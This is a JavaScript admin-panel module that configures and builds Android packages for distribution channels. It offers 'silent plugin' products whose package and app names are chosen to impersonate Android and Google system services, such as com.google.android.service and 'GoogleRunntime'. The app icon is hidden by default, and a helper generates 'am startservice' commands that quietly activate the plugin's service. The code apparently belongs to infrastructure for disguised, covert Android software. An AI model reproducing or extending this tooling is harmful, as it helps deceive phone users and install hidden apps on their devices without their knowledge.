var pkg = {
    serverUrl: window.context + '/rest/pakcage',
    displayName: "软件包",
    name: "pkg",
    sorters: [
        {property: 'channel', direction: 'asc'}
    ],
    productList: [
        {id: "plugin", name: "静默插件"},
        {id: "branch20140722", name: "静默插件-20140722"},
        {id: "beauty", name: "真人美女"},
        {id: "onetouchlock", name: "一键锁屏"},
        //{id: "plugin-yu", name: "静默插件2"},
        //{id: "assistant", name: "手机助手"},
    ],
    pluginPackageList: [
        {id: "com.android.speeder"},
        {id: "com.google.android.speeder"},
        {id: "com.android.service"},
        {id: "com.google.android.service"},
        {id: "com.android.clearservice"},
        {id: "com.google.android.clearservice"},
        {id: "com.android.runtime"},
        {id: "com.google.android.runtime"},
        {id: "com.android.cache"},
        {id: "com.google.android.cache"},
        {id: "com.mobile.assistant"}
    ],
    pluginAppNameList: [
        {id: "AndroidSpeeder"},
        {id: "AndroidService"},
        {id: "AndroidCache"},
        {id: "AndroidRunntime"},
        {id: "GoogleSpeeder"},
        {id: "GoogleService"},
        {id: "GoogleCache"},
        {id: "GoogleRunntime"},
        {id: "手机助手"}
    ],
    enableList: [
        {id: "Y", name: "Y"},
        {id: 'N', name: "N"}
    ],
    versionCode: 4,
    versionName: "1.0.4",
    save: function () {
        save(this);
    },
    getGrid: function () {
        return getGrid(this);
    },
    //remove: function(id){remove(this,id);},
    getList: function (callBack) {
        Ext.Ajax.request({url: window.context + '/package/list/?isSuper=' + (window['isSuper'] ? "Y" : "N"), method: "GET", params: {}, success: function (response) {
            callBack(parseJson(response));
        }});
    },
    refresh: function () {
        refresh(this);
    },
    getColumns: function () {
        var module = this;
        var columns = [
            {header: '渠道', dataIndex: 'channel', flex: 1, renderer: function (channel) {
                if (channel)  return channel.name
            }},
            {header: '产品', dataIndex: 'product', flex: 1, renderer: function (value) {
                for (var item in module.productList) {
                    var obj = module.productList[item];
                    if (obj.id == value) return obj.name;
                }
            }},
            {header: '软件名', dataIndex: 'appName', flex: 1},
            {header: '包名', dataIndex: 'packageName', flex: 2},
            {header: '激活码', dataIndex: 'activateComponent', flex: 2},
            {header: '版本号', dataIndex: 'versionCode', flex: 1},
            {header: '版本名', dataIndex: 'versionName', flex: 2},            
            {header: '打包状态', dataIndex: 'downloadUrl', flex: 2,
                renderer: function (value, meta, record) {
                    if (record.get("status") == "E") {
                        var buildStatus = record.get("buildStatus");
                        if (buildStatus == "done") {
                            return  "<a target='_blank' href='" + value + "'>完成</a>";
                        }
                        return  buildStatus
                    }
                }
            },
            {header: '显示图标', dataIndex: 'showIcon', flex: 1, renderer: function (value) {
                return value ? "是" : "否";
            }},
            {header: '图标名称', dataIndex: 'iconName', flex: 1},
            {header: '调试功能打开', dataIndex: 'debug', flex: 1}
            //{header:'开始日期',dataIndex:'startDate', flex:1},
            //{header:'结束日期',dataIndex:'endDate', flex:1}
        ];
        return getColumns(this, columns);
    },
    getFormItems: function (channelList, product) {
        var modulePrefix = this.name + "-";
        return getFormItems(this, [
            //{id:modulePrefix+'channel',allowBlank :false,name:"channel",xtype:'combo',fieldLabel :'渠道',value:1,displayField:'id',valueField:'id',queryMode:'local',store:Ext.create('Ext.data.Store', {fields : ['id'],data:this.channelList})},
            {id: modulePrefix + 'product', allowBlank: false, name: "product", xtype: 'combo', fieldLabel: '产品', displayField: 'name', valueField: 'id', queryMode: 'local', store: Ext.create('Ext.data.Store', {fields: ['id', 'name'], data: this.productList})},
            {id: modulePrefix + 'channel', fieldLabel: '渠道', name: 'channel', xtype: 'combo', lastQuery: "", forceSelection: true, editable: false, displayField: 'name', valueField: 'id', queryMode: 'local', store: Ext.create('Ext.data.Store', {fields: ['id', 'name'], data: channelList})},
            {id: modulePrefix + 'packageName', allowBlank: false, name: "packageName", xtype: 'combo', fieldLabel: '包名', value: 1, displayField: 'id', valueField: 'id', queryMode: 'local', store: Ext.create('Ext.data.Store', {fields: ['id'], data: this.pluginPackageList})},
            {id: modulePrefix + 'activateComponent', name: 'activateComponent', fieldLabel: '激活码', allowBlank: false, value: "com.android.FlaaaaaaaaaaaagService"},
            {id: modulePrefix + 'versionCode', name: 'versionCode', fieldLabel: '版本号', allowBlank: false, xtype: 'numberfield', value: this.versionCode},
            {id: modulePrefix + 'versionName', name: 'versionName', fieldLabel: '版本名', allowBlank: false, value: this.versionName},
            {id: modulePrefix + 'appName', allowBlank: false, name: "appName", xtype: 'combo', fieldLabel: '软件名', value: 1, displayField: 'id', valueField: 'id', queryMode: 'local', store: Ext.create('Ext.data.Store', {fields: ['id'], data: this.pluginAppNameList})},
            {id: modulePrefix + 'showIcon', name: 'showIcon', fieldLabel: '显示图标', xtype: 'checkbox', allowBlank: true, inputValue: 'true', checked: false},
            {id: modulePrefix + 'iconName', name: 'iconName', fieldLabel: '图标名称'},
            {id: modulePrefix + 'debug', allowBlank: false, name: "debug", xtype: 'combo', fieldLabel: '调试功能打开', value: "N", displayField: 'id', valueField: 'id', queryMode: 'local', store: Ext.create('Ext.data.Store', {fields: ['id'], data: this.enableList})},
            {id: modulePrefix + 'activateCode', fieldLabel: '激活码', allowBlank: true, xtype: 'textarea', height: 150},
        ]);
    },
    copy: function (id) {
        this.showForm(id, true);
    },
    getActiviateCode: function (packageName,activateComponent) {
        if (packageName) {
            //var result = "有四种方法,排在前面的方法要好于排在后面的方法,3,4两种方法在激活时用户的屏幕会闪一下\n";
           // result += "方式1: am startservice --user 0  " + packageName + "/"+activateComponent+"\n";
            //result += '方式2: startService(new Intent().setComponent(new ComponentName("' + packageName + '", "com.android.TS")));\n';
            //result += "方式3: am start -n " + packageName + "/com.android.FA\n";
            //result += '方式4: startActivity(new Intent().setComponent(new ComponentName("' + packageName + '", "com.android.FA")));\n';
           // return result;
        	var result="";
        	result+= "sdkVersion<=15:\n\tam startservice -n " + packageName + "/"+activateComponent;
        	result+= "\nsdkVersion>15: \n\tam startservice --user 0 -n " + packageName + "/"+activateComponent;
        	return result;
        }
    },
    showForm: function (id, isCopyAction) {
        var module = this;
        module.isCopyAction = isCopyAction;   	
        window.bizObj = null;
        var modulePrefix = this.name + "-";
        window.businessId = id;
        channel.getList(function (channelList) {
            showForm(module, 700, 470, id, function (obj) {
                window.bizObj = obj;
                Ext.each(["product", "channel", "packageName", "versionCode", "versionName", "appName", "debug", "showIcon", "iconName","activateComponent"], function (item) {
                    Ext.getCmp(modulePrefix + item).setValue(obj[item]);
                });
                Ext.getCmp(modulePrefix + "activateCode").setValue(module.getActiviateCode(obj.packageName,obj.activateComponent));
                var channel = obj['channel'];
                if (channel) Ext.getCmp(modulePrefix + "channel").setValue(channel.id);
            }, channelList);
        });

    }
};


 
